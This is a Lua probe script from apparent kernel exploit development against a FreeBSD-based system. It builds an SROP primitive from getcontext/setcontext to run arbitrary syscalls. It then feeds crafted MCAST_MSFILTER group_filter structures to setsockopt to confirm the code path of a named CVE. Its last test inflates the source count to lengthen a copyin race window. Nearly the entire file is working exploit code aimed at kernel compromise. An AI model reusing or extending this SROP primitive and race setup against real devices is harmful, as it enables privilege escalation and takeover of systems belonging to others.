-- CRASH_CLASS: LOW
-- PROBE 182a: MCAST_MSFILTER (option 72) confirmation with struct group_filter
--
-- 181a: setsockopt(IPPROTO_IP, 72, 4-byte-zero) = 0
-- FreeBSD defines MCAST_MSFILTER=72 for RFC3678 API.
-- This is the SAME vulnerable code path as CVE-2026-49412!
-- The fix patched in_mcast.c which handles this option.
--
-- This probe tests with the proper struct group_filter to confirm
-- the source filter path is actually executing.

print("=== 182a: MCAST_MSFILTER CONFIRM ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x20000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Create IPv4 UDP socket
local rv = srop(97, uint64(2), uint64(2), uint64(0))
local s = rv and to_num(rv) or -1
print("sock=" .. s)
if s < 0 then print("DEAD") return end

-- Bind
local BIND = 0x1000
for i = 0, 0x1F, 4 do wd(gpu + BIND + i, 0) end
wd(gpu + BIND, 0x00000210)  -- len=16, family=2
rv = srop(104, uint64(s), ga(BIND), uint64(16))
print("bind=" .. (rv and to_num(rv) or -999))

-- Join multicast 224.0.0.1
local MREQ = 0x2000
wd(gpu + MREQ, 0x010000E0)  -- 224.0.0.1
wd(gpu + MREQ + 4, 0)       -- any interface
rv = srop(105, uint64(s), uint64(0), uint64(12), ga(MREQ), uint64(8))
print("JOIN=" .. (rv and to_num(rv) or -999))

-- Test A: MCAST_MSFILTER with 4-byte value (181a baseline)
print("")
print("--- A: MCAST_MSFILTER 4-BYTE ---")
wd(gpu + 0x3000, 0)
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(0x3000), uint64(4))
print("opt72_4byte=" .. (rv and to_num(rv) or -999))

-- Test B: MCAST_MSFILTER with struct group_filter (0 sources)
-- struct group_filter:
--   uint32_t gf_interface;        +0x00
--   struct sockaddr_storage gf_group;  +0x04 (128 bytes)
--   uint32_t gf_fmode;            +0x84
--   uint32_t gf_numsrc;           +0x88
--   struct sockaddr_storage gf_slist[]; +0x8C
-- Total base size: 0x8C (140 bytes)
print("")
print("--- B: MCAST_MSFILTER WITH GROUP_FILTER (0 SRC) ---")
local GF = 0x4000
for i = 0, 0xFF, 4 do wd(gpu + GF + i, 0) end
-- gf_interface = 0 (any)
wd(gpu + GF + 0, 0)
-- gf_group: sockaddr_in inside sockaddr_storage
-- sockaddr_in: len=16, family=2, port=0, addr=224.0.0.1
wd(gpu + GF + 4, 0x00100002)    -- sin_len=16, sin_family=2
wd(gpu + GF + 4 + 4, 0x010000E0)  -- 224.0.0.1
-- gf_fmode = MCAST_INCLUDE (1)
wd(gpu + GF + 0x84, 1)
-- gf_numsrc = 0
wd(gpu + GF + 0x88, 0)

rv = srop(105, uint64(s), uint64(0), uint64(72), ga(GF), uint64(0x8C))
local mf0 = rv and to_num(rv) or -999
print("MCAST_MSFILTER(0src)=" .. mf0)

-- Test C: With 1 source
print("")
print("--- C: MCAST_MSFILTER WITH 1 SOURCE ---")
wd(gpu + GF + 0x88, 1)  -- gf_numsrc = 1
-- gf_slist[0] = sockaddr_in for 127.0.0.1
local SL = GF + 0x8C
for i = 0, 0x7F, 4 do wd(gpu + SL + i, 0) end
wd(gpu + SL, 0x00100002)        -- sin_len=16, sin_family=2
wd(gpu + SL + 4, 0x0100007F)    -- 127.0.0.1

rv = srop(105, uint64(s), uint64(0), uint64(72), ga(GF), uint64(0x10C))
local mf1 = rv and to_num(rv) or -999
print("MCAST_MSFILTER(1src)=" .. mf1)

-- Test D: With 4 sources (to exercise the copyin path)
print("")
print("--- D: MCAST_MSFILTER WITH 4 SOURCES ---")
wd(gpu + GF + 0x88, 4)  -- gf_numsrc = 4
for src = 0, 3 do
    local off = GF + 0x8C + src * 128
    for i = 0, 0x7F, 4 do wd(gpu + off + i, 0) end
    wd(gpu + off, 0x00100002)
    wd(gpu + off + 4, 0x0100007F + src * 0x01000000)  -- 127.0.0.1-4
end
-- Total size: 0x8C + 4*128 = 0x28C
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(GF), uint64(0x28C))
local mf4 = rv and to_num(rv) or -999
print("MCAST_MSFILTER(4src)=" .. mf4)

-- Test E: getsockopt to read back filter
print("")
print("--- E: GETSOCKOPT MCAST_MSFILTER ---")
local GR = 0x8000
for i = 0, 0x2FF, 4 do wd(gpu + GR + i, 0) end
-- Need to set up group in request
wd(gpu + GR + 0, 0)             -- gf_interface
wd(gpu + GR + 4, 0x00100002)    -- sockaddr_in
wd(gpu + GR + 8, 0x010000E0)    -- 224.0.0.1
local OLEN = 0xB000
wd(gpu + OLEN, 0x300)
rv = srop(118, uint64(s), uint64(0), uint64(72), ga(GR), ga(OLEN))
local mg = rv and to_num(rv) or -999
print("getsockopt(72)=" .. mg)
if mg == 0 then
    local olen = rd(gpu + OLEN)
    local fmode = rd(gpu + GR + 0x84)
    local numsrc = rd(gpu + GR + 0x88)
    print("  optlen=" .. olen .. " fmode=" .. fmode .. " numsrc=" .. numsrc)
    if numsrc > 0 and numsrc < 10 then
        for src = 0, numsrc - 1 do
            local off = GR + 0x8C + src * 128
            local addr = rd(gpu + off + 4)
            print("  src" .. src .. "=" .. string.format("0x%08X", addr))
        end
    end
end

-- Test F: MCAST_EXCLUDE mode
print("")
print("--- F: MCAST_EXCLUDE ---")
wd(gpu + GF + 0x84, 2)  -- MCAST_EXCLUDE
wd(gpu + GF + 0x88, 0)  -- 0 sources (= accept all)
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(GF), uint64(0x8C))
local mfx = rv and to_num(rv) or -999
print("MCAST_MSFILTER(EXCLUDE, 0src)=" .. mfx)

-- Test G: Large source count (to make copyin take longer for the race)
print("")
print("--- G: LARGE SOURCE COUNT ---")
wd(gpu + GF + 0x84, 1)   -- MCAST_INCLUDE
wd(gpu + GF + 0x88, 64)  -- 64 sources
-- Fill 64 source addresses
for src = 0, 63 do
    local off = GF + 0x8C + src * 128
    for i = 0, 0x7F, 4 do wd(gpu + off + i, 0) end
    wd(gpu + off, 0x00100002)
    wd(gpu + off + 4, 0x0100007F + src * 0x01000000)
end
-- Total: 0x8C + 64*128 = 0x208C
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(GF), uint64(0x208C))
local mf64 = rv and to_num(rv) or -999
print("MCAST_MSFILTER(64src)=" .. mf64)

if mf64 == 0 then
    print("!!! 64-SOURCE FILTER ACCEPTED !!!")
    print("!!! LARGE COPYIN WINDOW FOR CVE-2026-49412 RACE !!!")
end

srop(6, uint64(s))
print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
